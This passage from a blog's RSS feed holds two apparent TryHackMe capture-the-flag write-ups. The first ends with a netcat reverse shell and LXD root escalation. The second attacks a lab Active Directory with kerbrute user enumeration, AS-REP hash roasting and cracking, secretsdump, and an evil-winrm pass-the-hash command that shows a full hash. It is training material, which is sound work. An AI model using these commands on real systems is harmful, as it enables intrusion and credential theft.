  &lt;/span&gt;11   │         &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /tmp/&lt;span class=&quot;nv&quot;&gt;$LINE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; | Removed file /tmp/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LINE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /var/ftp/scripts/removed_files
       │ .log&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done
  &lt;/span&gt;12   │ &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In another terminal i started a Netcat Listener on port 8080: “nc -lnvp 8080”&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 8080
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8080 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and after a few seconds i got a shell on the target:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 8080
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8080 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.11.3.139] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.195.20] 53182
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2584&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
namelessone@anonymous:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this shell we can now read the User-flag.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;namelessone@anonymous:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;pics
user.txt
namelessone@anonymous:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
9&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So half way done on the target. Now we want root access on the client. :)&lt;/p&gt;

&lt;h2 id=&quot;privilage-escalation&quot;&gt;Privilage-Escalation&lt;/h2&gt;

&lt;p&gt;For my Privilage-Escalation i exploit the LXD-Vulnerability on the target.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;namelessone@anonymous:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;namelessone&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;namelessone&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;namelessone&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,27&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,108&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lxd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The command “id” shows me that the user is in the LXD-Group. LXD is a container software manager. Its like Doker.&lt;/p&gt;

&lt;p&gt;There is a Vulnerability of the LXD-Container:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/46978&quot;&gt;Exploit-DB-LXD-Vulnerability&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;For the Exploitation i followed the steps in the Command section of the file:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Step 1: Download build-alpine =&amp;gt; wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Step 2: Build alpine =&amp;gt; bash build-alpine (as root user) [Attacker Machine]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Step 3: Run this script and you will get root [Victim Machine]&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When this steps are done we can now run the script on the target:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;namelessone@anonymous:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./get-root.sh &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; alpine-v3.12-x86_64-20200927_2146.tar.gz
&amp;lt;root.sh &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; alpine-v3.12-x86_64-20200927_2146.tar.gz
Image imported with fingerprint: e35751259917ef3b79e8aac7a30a93178e6da525f5b4cf76bef49452d5d09997
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine | e35751259917 | no     | alpine v3.12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;20200927_21:46&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | x86_64 | 3.05MB | Sep 27, 2020 at 8:40pm &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UTC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
Creating privesc
Device giveMeRoot added to privesc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s check if we are root with the command “id”:&lt;/p&gt;
&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this Vulnerability. The Exploit is loading a Container and is mounting the /root folder to the mounting path “/mnt/root/”.&lt;/p&gt;

&lt;p&gt;In this path we can now check the root-flag of the target.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /mnt/root/root
&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
/mnt/root/root
&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;root.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
4&lt;span class=&quot;k&quot;&gt;******************************&lt;/span&gt;3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we have the root-flag and we have pwned the machine.&lt;/p&gt;

&lt;h1 id=&quot;summary&quot;&gt;Summary:&lt;/h1&gt;

&lt;p&gt;This room was interessting, because of the change of the script witch is running on the target for getting a reverse shell.&lt;/p&gt;

&lt;p&gt;When i got the first shell on the target, the Priv-Escalation was straight forward. With LXD it was no new stuff.&lt;/p&gt;
</description>
        <pubDate>Sun, 27 Sep 2020 23:14:00 +0000</pubDate>
        <link>/blog/anonymous/</link>
        <guid isPermaLink="true">/blog/anonymous/</guid>
      </item>
    
      <item>
        <title>Writeup - THM - Attacktive Directory</title>
        <description>&lt;h1 id=&quot;general-information&quot;&gt;General Information&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Room&lt;/th&gt;
      &lt;th&gt;Date&lt;/th&gt;
      &lt;th&gt;Difficulty&lt;/th&gt;
      &lt;th&gt;Tags&lt;/th&gt;
      &lt;th&gt;Time&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Attacktive Directory&lt;/td&gt;
      &lt;td&gt;03.11.2020&lt;/td&gt;
      &lt;td&gt;medium&lt;/td&gt;
      &lt;td&gt;Active Directory, AD, Kerberos, SMB&lt;/td&gt;
      &lt;td&gt;6h&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;used-programs&quot;&gt;Used Programs&lt;/h1&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Program&lt;/th&gt;
      &lt;th&gt;Command&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;namp&lt;/td&gt;
      &lt;td&gt;nmap -sC -sV -oN nmap/initial $ip&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rustscan&lt;/td&gt;
      &lt;td&gt;rustscan $ip –ulimit 5000 – -sC -sV -oN nmap/initial  tee output&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;enum4linux&lt;/td&gt;
      &lt;td&gt;enum4linux -d $ip&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;kerbrute&lt;/td&gt;
      &lt;td&gt;./kerbrute_linux_amd64 userenum -d spookysec.local –dc spookysec.local ‘/home/fr3akazo1d/Pen-Testing/THM/Boxes/AttractiveDirectory/user.txt’&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;GetNPUser.py&lt;/td&gt;
      &lt;td&gt;python3 GetNPUsers.py spookysec.local/s&lt;strong&gt;**&lt;/strong&gt;*n -no-pass&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;JohnTheRipper&lt;/td&gt;
      &lt;td&gt;sudo john kerberushash –wordlist=password.txt&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;metapsloit&lt;/td&gt;
      &lt;td&gt;msf6 auxiliary(admin/smb/download_file)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;smbclient&lt;/td&gt;
      &lt;td&gt;smbclient \\spookysec.local\backup -U s&lt;strong&gt;**&lt;/strong&gt;*n&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;secretsdump.py&lt;/td&gt;
      &lt;td&gt;python3 secretsdump.py -just-dc backup@spookysec.local&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;evil-winrm&lt;/td&gt;
      &lt;td&gt;evil-winrm -u administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.124.175&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;usefull-information&quot;&gt;Usefull Information&lt;/h1&gt;

&lt;p&gt;I have added the IP-Address of the room to my local /etc/hosts file, because we need it for further enumeration of the domain controller.&lt;/p&gt;

&lt;h1 id=&quot;impacket&quot;&gt;Impacket&lt;/h1&gt;

&lt;p&gt;For this Room we have to install Impacket.&lt;/p&gt;

&lt;h2 id=&quot;installing-impacket&quot;&gt;Installing Impacket:&lt;/h2&gt;

&lt;p&gt;First, you’ll want to clone the repo with:&lt;/p&gt;

&lt;p&gt;git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket&lt;/p&gt;

&lt;p&gt;This will clone Impacket to /opt/impacket/, after the repo is cloned, you will notice several install related files, requirements.txt, and setup.py. Setup.py is commonly skipped during the installation. It’s key that you DO NOT miss it.&lt;/p&gt;

&lt;p&gt;So let’s install the requirements:&lt;/p&gt;

&lt;p&gt;pip3 install -r /opt/impacket/requirements.txt&lt;/p&gt;

&lt;p&gt;Once all the python modules are installed, we can then run the python setup install script:&lt;/p&gt;

&lt;p&gt;cd /opt/impacket/ &amp;amp;&amp;amp; python3 ./setup.py install&lt;/p&gt;

&lt;p&gt;After that, Impacket should be correctly installed now and it should be ready to use!&lt;/p&gt;

&lt;p&gt;If you are still having issues, you can try the following:
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
sudo pip3 install -r /opt/impacket/requirements.txt
sudo cd /opt/impacket/ 
sudo pip3 install .
sudo python3 setup.py install&lt;/p&gt;

&lt;h1 id=&quot;enumerating-the-dc&quot;&gt;Enumerating the DC&lt;/h1&gt;

&lt;p&gt;We used the the script “enum4linux” to enumerate the Target.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;enum4linux &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tee &lt;/span&gt;enum4linux.txt                                                                                                                                                                                              130 ⨯
Starting enum4linux v0.8.9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/enum4linux/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on Tue Nov  3 21:10:45 2020

 &lt;span class=&quot;o&quot;&gt;==========================&lt;/span&gt; 
|    Target Information    |
 &lt;span class=&quot;o&quot;&gt;==========================&lt;/span&gt; 
Target ........... 10.10.124.175
RID Range ........ 500-550,1000-1050
Username ......... &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
Password ......... &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 &lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt; 
|    Enumerating Workgroup/Domain on 10.10.124.175    |
 &lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt; 
Use of uninitialized value &lt;span class=&quot;nv&quot;&gt;$global_workgroup&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;concatenation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or string at ./enum4linux.pl line 437.
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] Can&lt;span class=&quot;s1&quot;&gt;'t find workgroup/domain


 ====================================== 
|    Session Check on 10.10.124.175    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
[+] Server 10.10.124.175 allows sessions using username '', password ''
[+] Got domain/workgroup name: 

 ============================================ 
|    Getting domain SID for 10.10.124.175    |
 ============================================ 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)
enum4linux complete on Tue Nov  3 21:10:57 2020
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;enumerating-the-dc-pt2&quot;&gt;Enumerating the DC Pt2&lt;/h1&gt;

&lt;p&gt;The next step is to use the program “kerbrute” to get the username of the Domain.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[/git/kerbrute]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./kerbrute_linux_amd64 userenum &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; spookysec.local &lt;span class=&quot;nt&quot;&gt;--dc&lt;/span&gt; spookysec.local &lt;span class=&quot;s1&quot;&gt;'/home/fr3akazo1d/Pen-Testing/THM/Boxes/AttacktriveDirectory/user.txt'&lt;/span&gt;

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; ___/ __ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; ___/ / / / __/ _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/_/  /_.___/_/   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/                                        

Version: v1.0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9dad6e1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - 11/03/20 - Ronnie Flathers @ropnop

2020/11/03 21:28:23 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  Using KDC&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
2020/11/03 21:28:23 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  	spookysec.local:88

2020/11/03 21:28:23 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 j&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;s@spookysec.local
2020/11/03 21:28:25 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 s&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n@spookysec.local
2020/11/03 21:28:26 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 J&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;s@spookysec.local
2020/11/03 21:28:26 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 r&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;n@spookysec.local
2020/11/03 21:28:32 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 d&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;r@spookysec.local
2020/11/03 21:28:35 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 a&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r@spookysec.local
2020/11/03 21:28:42 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 b&lt;span class=&quot;k&quot;&gt;****&lt;/span&gt;p@spookysec.local
2020/11/03 21:28:46 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 p&lt;span class=&quot;k&quot;&gt;*****&lt;/span&gt;x@spookysec.local
2020/11/03 21:29:07 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 J&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;S@spookysec.local
2020/11/03 21:29:15 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 R&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;n@spookysec.local
2020/11/03 21:29:57 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 A&lt;span class=&quot;k&quot;&gt;***********&lt;/span&gt;r@spookysec.local
2020/11/03 21:31:25 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 D&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;r@spookysec.local
2020/11/03 21:31:52 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 P&lt;span class=&quot;k&quot;&gt;*****&lt;/span&gt;x@spookysec.local
2020/11/03 21:33:24 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 D&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;R@spookysec.local
2020/11/03 21:33:51 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 o&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;i@spookysec.local
2020/11/03 21:34:41 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:	 R&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;N@spookysec.local
2020/11/03 21:39:46 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  Done! Tested 100000 usernames &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16 valid&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;682.522 seconds

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Kerbrute found some Username for the Domain.&lt;/p&gt;

&lt;h1 id=&quot;exploiting-kerberos&quot;&gt;Exploiting Kerberos&lt;/h1&gt;

&lt;p&gt;For a kerberus Ticket we use the program “GetNPUser.py” script from impacket. This will receive a kerberus hash.
This has can be cracked with the provided Password list from this room and johntheripper.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 GetNPUsers.py spookysec.local/s&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;n-no-pass 
Impacket v0.9.22.dev1+20201015.130615.81eec85a - Copyright 2020 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Getting TGT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;s&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;n
&lt;span class=&quot;nv&quot;&gt;$krb5asrep$23$s&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;n@SPOOKYSEC.LOCAL:a&lt;span class=&quot;k&quot;&gt;***********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************&lt;/span&gt;b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hashcracking with JohnTheRipper:&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fr3akazo1d💀fr3ak0ut&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;-[~/Pen-Testing/THM/Boxes/AttacktriveDirectory]
└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;john kerberushash &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;password.txt
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5asrep, Kerberos 5 AS-REP etype 17/18/23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 4 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
m&lt;span class=&quot;k&quot;&gt;************&lt;/span&gt;5   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$krb5asrep$23$s&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;n@SPOOKYSEC.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
